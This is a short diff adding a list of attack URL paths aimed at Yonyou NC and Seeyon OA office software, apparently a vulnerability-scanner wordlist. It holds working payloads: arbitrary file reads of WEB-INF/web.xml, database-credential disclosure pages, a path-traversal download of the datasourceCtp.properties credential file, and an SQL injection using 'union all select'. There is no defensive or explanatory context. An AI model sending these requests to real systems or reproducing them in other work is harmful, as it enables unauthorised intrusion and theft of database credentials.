@@ -1,0 +1,5 @@
+/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+/yyoa/createMysql.jsp
+/yyoa/ext/createMysql.jsp
+/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties
+/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(123)),4#
